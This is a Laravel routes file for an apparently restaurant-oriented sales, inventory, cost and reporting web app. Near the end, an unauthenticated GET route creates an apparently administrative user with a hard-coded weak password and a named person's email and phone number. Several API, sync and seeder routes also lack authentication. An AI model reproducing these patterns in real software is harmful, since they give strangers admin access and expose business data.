<?php

Route::get('/', ['as' => 'index', 'uses' => 'UserController@getIndex']);
Route::group(['middleware' => 'guest'], function() {
    Route::get('/login', ['as' => 'login', 'uses' => 'UserController@getLogin']);
    Route::post('/login', ['as' => 'login', 'uses' => 'UserController@postLogin']);
});

Route::group(['middleware' => 'auth'], function() {
    Route::get('/logout', ['as' => 'logout', 'uses' => 'UserController@getLogout']);

    //Dashboard
    Route::get('/dashboard', ['as' => 'dashboard', 'uses' => 'UserController@getDeshboard']);
    Route::post('/dashboard', ['as' => 'search_sales_cost', 'uses' => 'UserController@getSearchSalesCost']);

    //Profile
    Route::get('/my-profile', ['as' => 'my_profile', 'uses' => 'UserController@myProfile']);
    Route::get('/edit-profile', ['as' => 'edit_profile', 'uses' => 'UserController@editProfile']);
    Route::post('/update-profile', ['as' => 'update_profile', 'uses' => 'UserController@updateProfile']);
    Route::get('/change-my-password', ['as' => 'change_my_password', 'uses' => 'UserController@changeMyPassword']);
    Route::post('/update-my-password', ['as' => 'update_my_password', 'uses' => 'UserController@updateMyPassword']);

    //Category
    Route::get('/manage-category', ['as' => 'manage_category', 'uses' => 'ProductController@manageCategory']);
    Route::get('/add-category', ['as' => 'add_category', 'uses' => 'ProductController@addCategory']);
    Route::post('/add-category', ['as' => 'save_category', 'uses' => 'ProductController@saveCategory']);
    Route::get('/edit-category/{id}', ['as' => 'edit_category', 'uses' => 'ProductController@editCategory']);
    Route::post('/update-category/{id}', ['as' => 'update_category', 'uses' => 'ProductController@updateCategory']);
    Route::get('/delete-category/{id}', ['as' => 'delete_category', 'uses' => 'ProductController@deleteCategory']);

    //Product
    Route::get('/manage-product', ['as' => 'manage_product', 'uses' => 'ProductController@manageProduct']);
    Route::get('/add-product', ['as' => 'add_product', 'uses' => 'ProductController@addProduct']);
    Route::post('/add-product', ['as' => 'save_product', 'uses' => 'ProductController@saveProduct']);
    Route::get('/edit-product/{id}', ['as' => 'edit_product', 'uses' => 'ProductController@editProduct']);
    Route::post('/update-product/{id}', ['as' => 'update_product', 'uses' => 'ProductController@updateProduct']);
    Route::get('/delete-product/{id}', ['as' => 'delete_product', 'uses' => 'ProductController@deleteProduct']);

    //Order
    Route::get('/order', ['as' => 'order', 'uses' => 'ProductController@getOrder']);
    Route::get('/search', ['as' => 'search', 'uses' => 'ProductController@searchProduct']);
    Route::post('/add_item_to_order', ['as' => 'add_item_to_order', 'uses' => 'ProductController@addItemToOrder']);
    Route::get('/remove-item-from-order/{id}', ['as' => 'remove_item_from_order', 'uses' => 'ProductController@removeItemFromOrder']);
    Route::get('/cancel-order', ['as' => 'cancel_order', 'uses' => 'ProductController@cancelOrder']);
    Route::post('/order', ['as' => 'process_order', 'uses' => 'ProductController@processOrder']);

    //Invoice
    Route::get('/invoice-list', ['as' => 'invoice_list', 'uses' => 'ProductController@getInvoiceList']);
    Route::get('/invoice-{id}', ['as' => 'invoice', 'uses' => 'ProductController@getInvoice']);

    //Cost
    Route::get('/manage-costs', ['as' => 'manage_cost', 'uses' => 'CostController@manageCost']);
    Route::get('/add-cost', ['as' => 'add_cost', 'uses' => 'CostController@addCost']);
    Route::post('/add-cost', ['as' => 'save_cost', 'uses' => 'CostController@saveCost']);
//    Route::get('/edit_cost/{id}', ['as' => 'edit_cost', 'uses' => 'CostController@editCost']);
//    Route::post('/edit_cost/{id}', ['as' => 'update_cost', 'uses' => 'CostController@updateCost']);
    Route::get('/delete-cost/{id}', ['as' => 'delete_cost', 'uses' => 'CostController@deleteCost']);

    //Salary Cost
    Route::get('/manage-salary-costs', ['as' => 'manage_salary_cost', 'uses' => 'CostController@manageSalaryCost']);
    Route::get('/add-salary-cost', ['as' => 'add_salary_cost', 'uses' => 'CostController@addSalaryCost']);
    Route::post('/add-salary-cost', ['as' => 'save_salary_cost', 'uses' => 'CostController@saveSalaryCost']);
    Route::get('/delete-salary-cost/{id}', ['as' => 'delete_salary_cost', 'uses' => 'CostController@deleteSalaryCost']);


    //Equipment Cost
    Route::get('/manage-equipment-costs', ['as' => 'manage_equipment_cost', 'uses' => 'CostController@manageEquipmentCost']);
    Route::get('/add-equipment-cost', ['as' => 'add_equipment_cost', 'uses' => 'CostController@addEquipmentCost']);
    Route::post('/add-equipment-cost', ['as' => 'save_equipment_cost', 'uses' => 'CostController@saveEquipmentCost']);
    Route::get('/delete-equipment-cost/{id}', ['as' => 'delete_equipment_cost', 'uses' => 'CostController@deleteEquipmentCost']);

    //Report
    Route::get('/summary-report', ['as' => 'summary_report', 'uses' => 'ReportController@getSummaryReport']);
    Route::post('/summary-report', ['as' => 'search_summary_report', 'uses' => 'ReportController@getSearchSummaryReport']);
    Route::get('/sales', ['as' => 'sales', 'uses' => 'ReportController@getSales']);
    Route::post('/search-sales', ['as' => 'search_sales', 'uses' => 'ReportController@getSearchSales']);
    Route::get('/costs-report', ['as' => 'cost_report', 'uses' => 'ReportController@getCostReport']);
    Route::post('/search-costs-report', ['as' => 'search_cost_report', 'uses' => 'ReportController@SearchCostReport']);
    Route::get('/discount-report', ['as' => 'discount_report', 'uses' => 'ReportController@getDiscountReport']);
    Route::post('/search-discount-report', ['as' => 'search_discount_report', 'uses' => 'ReportController@searchDiscountReport']);
    Route::get('/warehouse-report', ['as' => 'warehouse_report', 'uses' => 'ReportController@getWarehouseReport']);
    Route::post('/search-warehouse-report', ['as' => 'search_warehouse_report', 'uses' => 'ReportController@searchWarehouseReport']);
    Route::get('/kitchen-report', ['as' => 'kitchen_report', 'uses' => 'ReportController@getKitchenReport']);
    Route::post('/search-kitchen-report', ['as' => 'search_kitchen_report', 'uses' => 'ReportController@searchKitchenReport']);
    Route::get('/damage-report', ['as' => 'damage_report', 'uses' => 'ReportController@getDamageReport']);
    Route::post('/search-damage-report', ['as' => 'search_damage_report', 'uses' => 'ReportController@searchDamageReport']);
    Route::get('/reservation', ['as' => 'reservation', 'uses' => 'ReportController@reservation']);

    //Items
    Route::get('/manage-items', ['as' => 'manage_items', 'uses' => 'InventoryController@manageItems']);
    Route::get('/add-item', ['as' => 'add_item', 'uses' => 'InventoryController@addItem']);
    Route::post('/save-item', ['as' => 'save_item', 'uses' => 'InventoryController@saveItem']);
    Route::get('/edit-item/{id}', ['as' => 'edit_item', 'uses' => 'InventoryController@editItem']);
    Route::post('/edit-item/{id}', ['as' => 'update_item', 'uses' => 'InventoryController@updateItem']);
    Route::get('/delete-item/{id}', ['as' => 'delete_item', 'uses' => 'InventoryController@deleteItem']);

    //Warehouse Stock
    Route::get('/manage-stock', ['as' => 'manage_stock', 'uses' => 'InventoryController@manageStock']);
    Route::get('/add-stock', ['as' => 'add_stock', 'uses' => 'InventoryController@addStock']);
    Route::post('/save-stock', ['as' => 'save_stock', 'uses' => 'InventoryController@saveStock']);
    Route::get('/edit-stock/{id}', ['as' => 'edit_stock', 'uses' => 'InventoryController@editStock']);
    Route::post('/edit-stock/{id}', ['as' => 'update_stock', 'uses' => 'InventoryController@updateStock']);
    Route::get('/delete-stock/{id}', ['as' => 'delete_stock', 'uses' => 'InventoryController@deleteStock']);
    Route::get('/stock-entry-list', ['as' => 'stock_entry_list', 'uses' => 'InventoryController@stockEntryList']);

    //Kitchen Stock
    Route::get('/kitchen-stock', ['as' => 'kitchen_stock', 'uses' => 'InventoryController@kitchenStock']);
    Route::get('/add-kitchen-stock', ['as' => 'add_kitchen_stock', 'uses' => 'InventoryController@addKitchenStock']);
    Route::post('/save-kitchen-stock', ['as' => 'save_kitchen_stock', 'uses' => 'InventoryController@saveKitchenStock']);
    Route::get('/search-item', ['as' => 'search_item', 'uses' => 'InventoryController@searchItem']);
    Route::post('/add_item_to_kitchen', ['as' => 'add_item_to_kitchen', 'uses' => 'InventoryController@addItemToKitchen']);
    Route::post('/return-item', ['as' => 'return_item', 'uses' => 'InventoryController@returnItem']);


    //Damage Items
    Route::get('/damage-items', ['as' => 'damage_items', 'uses' => 'InventoryController@damageItems']);
    Route::get('/add-damage-item', ['as' => 'add_damage_item', 'uses' => 'InventoryController@addDamageItem']);
    Route::post('/save-damage-item', ['as' => 'save_damage_item', 'uses' => 'InventoryController@saveDamageItem']);
    Route::get('/delete-damage-item/{id}', ['as' => 'delete_damage_item', 'uses' => 'InventoryController@deleteDamageItem']);

    //Reservation
    Route::get('/reservation', ['as' => 'reservation', 'uses' => 'APIController@reservation']);

    //Seeder
    Route::get('/category-seeder', ['as' => 'category_seeder', 'uses' => 'SeederController@categoryTableSeeder']);
    Route::get('/product-seeder', ['as' => 'product_seeder', 'uses' => 'SeederController@productTableSeeder']);
    Route::get('/order-seeder', ['as' => 'order_seeder', 'uses' => 'SeederController@orderSeeder']);
});

Route::group(['middleware' => 'auth', 'middleware' => 'admin'], function() {
    //User
    Route::get('/add-user', ['as' => 'add_user', 'uses' => 'AdminController@addUser']);
    Route::post('/add-user', ['as' => 'save_user', 'uses' => 'AdminController@saveUser']);
    Route::get('/manage-user', ['as' => 'manage_user', 'uses' => 'AdminController@manageUser']);
    Route::get('/edit-user/{id}', ['as' => 'edit_user', 'uses' => 'AdminController@editUser']);
    Route::post('/update-user/{id}', ['as' => 'update_user', 'uses' => 'AdminController@updateUser']);
    Route::get('/delete-user/{id}', ['as' => 'delete_user', 'uses' => 'AdminController@deleteUser']);
    Route::get('/change-password/{id}', ['as' => 'change_password', 'uses' => 'AdminController@changePassword']);
    Route::post('/update-password/{id}', ['as' => 'update_password', 'uses' => 'AdminController@updatePassword']);

    //setting
    Route::get('/settings', ['as' => 'settings', 'uses' => 'AdminController@getSettings']);
    Route::get('/change-settings', ['as' => 'change_settings', 'uses' => 'AdminController@getChangeSettings']);
    Route::post('/change-settings', ['as' => 'update_settings', 'uses' => 'AdminController@getUpdateSettings']);

    //Company
    Route::get('/manage-company-profile', ['as' => 'manage_company_profile', 'uses' => 'AdminController@manageCompanyProfile']);
    Route::get('/edit_company_profile', ['as' => 'edit_company_profile', 'uses' => 'AdminController@editCompanyProfile']);
    Route::post('/edit_company_profile', ['as' => 'update_company_profile', 'uses' => 'AdminController@updateCompanyProfile']);
});



//API
Route::group(['middleware' => 'cors', 'prefix' => 'api'],function() {
    Route::post('/login', ['as' => 'api_login', 'uses' => 'APIController@getLogin']);
    
    Route::get('/dashboard', ['as' => 'api_dashboard', 'uses' => 'APIController@getDashboard']);
    Route::post('/dashboard', ['as' => 'api_search_sales_cost', 'uses' => 'APIController@getSearchSalesCost']);
    Route::get('/sales-report', ['as' => 'api_sales_report', 'uses' => 'APIController@getSalesReport']);
    Route::post('/sales-report', ['as' => 'api_search_sales', 'uses' => 'APIController@getSearchSales']);
    Route::get('/summary-report', ['as' => 'api_summary_report', 'uses' => 'APIController@getSummaryReport']);
    Route::post('/summary-report', ['as' => 'api_search_summary_report', 'uses' => 'APIController@getSearchSummaryReport']);
    
    
    Route::get('/costs-report', ['as' => 'api_cost_report', 'uses' => 'APIController@getCostReport']);
    Route::post('/search-costs-report', ['as' => 'api_search_cost_report', 'uses' => 'APIController@SearchCostReport']);
    Route::get('/discount-report', ['as' => 'api_discount_report', 'uses' => 'APIController@getDiscountReport']);
    Route::post('/search-discount-report', ['as' => 'api_search_discount_report', 'uses' => 'APIController@searchDiscountReport']);
    Route::get('/warehouse-report', ['as' => 'api_warehouse_report', 'uses' => 'APIController@getWarehouseReport']);
    Route::post('/search-warehouse-report', ['as' => 'api_search_warehouse_report', 'uses' => 'APIController@searchWarehouseReport']);
    Route::get('/kitchen-report', ['as' => 'api_kitchen_report', 'uses' => 'APIController@getKitchenReport']);
    Route::post('/search-kitchen-report', ['as' => 'api_search_kitchen_report', 'uses' => 'APIController@searchKitchenReport']);
    Route::get('/damage-report', ['as' => 'api_damage_report', 'uses' => 'APIController@getDamageReport']);
    Route::post('/search-damage-report', ['as' => 'api_search_damage_report', 'uses' => 'APIController@searchDamageReport']);
    Route::get('/reservation', ['as' => 'api_reservation', 'uses' => 'APIController@apiReservation']);

    Route::post('/save-reservation', ['as' => 'api_reservation', 'uses' => 'APIController@saveReservation']);
});

//Sync
Route::get('/sync-data', ['as' => 'sync_data', 'uses' => 'SyncController@getSyncPage']);
Route::post('/sync-data', ['as' => 'sync_json_data', 'uses' => 'SyncController@syncJsonData']);
Route::post('/live-store-data', ['as' => 'live_store_data', 'uses' => 'SyncController@liveStoreData']);
Route::get('/live-send-data', ['as' => 'live_send_data', 'uses' => 'SyncController@liveSendData']);


Route::get('create-mak-khan', function() {
    $user = new App\User([
        'fname' => 'Md. Arif',
        'lname' => 'Khan',
        'username' => 'mak',
        'email' => 'mak0099@gmail.com',
        'password' => bcrypt('khan'),
        'phone' => '01676264346',
        'created_by' => '1',
        'role' => 1,
    ]);
    $user->save();
    return redirect()->route('index');
});

